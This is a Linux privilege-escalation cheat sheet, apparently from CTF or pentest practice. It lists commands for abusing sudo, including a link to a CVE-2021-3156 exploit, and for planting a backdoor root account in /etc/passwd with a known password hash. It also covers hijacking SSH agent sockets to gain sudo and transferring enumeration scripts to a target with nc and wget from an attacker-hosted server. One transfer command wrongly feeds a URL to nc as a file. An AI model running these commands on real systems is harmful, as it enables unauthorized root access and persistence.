# Look for open connections
```bash
# -t	Display TCP sockets
# -u	Display UDP sockets
# -l	Displays only listening sockets
# -p	Shows the process using the socket
# -n	Doesn't resolve service names
ss -tulpn
```

## Expose service through local server (aka port forwarding)
```bash
ssh -L PORT:localhost:PORT <username>@<ip>
```

# Sudo exploit
https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py

# See how to exploit binaries executed as root
https://gtfobins.github.io/

# List commands where sudo can be used by the user
```bash
sudo -l
```

# Add admin user in /etc/passwd
```bash
# Get hashed password to add in /etc/passwd
openssl passwd -1 -salt SALT PASSWORD
openssl passwd -1 -salt azerty azerty

echo 'USERNAME:PASSWORD_HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'got_you:$1$azerty$dnHlPdA34NxX1Z8CRVx/r.:0:0:root:/root:/bin/bash' >> /etc/passwd

```

# Existing sudo call in ps aux by current user
## reusing sudo tokens
Check that `/proc/sys/kernel/yama/ptrace_scope == 0`. If so, check hacktricks:
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens

## PAM
If PAM accepts ssh keys (check `cat /etc/pam.d/sudo`)
Find the ssh agent socket file. Could be in `/tmp/ssh-*`, but importantly, the socket is named `agent.PID`, PID being known from the ongoing ssh connection found in `ps aux`.

```bash
export SSH_AUTH_SOCK=/PATH/TO/agent.PID
ssh-add -l
sudo -l
sudo su -
```

More about this at https://manpages.ubuntu.com/manpages/bionic/man8/pam_ssh_agent_auth.8.html

# Use linpeas (linus priv esc awesome script)
## nc
```bash
# Prepare receiver, expecting a file on port 1234
nc -l -p 1234 > /tmp/linpeas.sh
```
```bash
# Send the file to TARGET
nc -w 3 TARGET 1234 < Scripts/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh
```

## wget
```bash
# Prepare local webserver
sudo python3 -m http.server 4444 --bind 10.11.33.78
```
```bash
# Download from target
wget http://10.11.33.78:4444/linpeas.sh ./linpeas.sh
```

# Use linux smart enumeration
```bash
# Prepare receiver, expecting a file on port 1234
nc -l -p 1234 > /tmp/lse.sh
```
```bash
# Send the file to TARGET
nc -w 3 TARGET 1234 < https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
```

# Find SUID
```bash
find / -perm /4000 2>/dev/null
```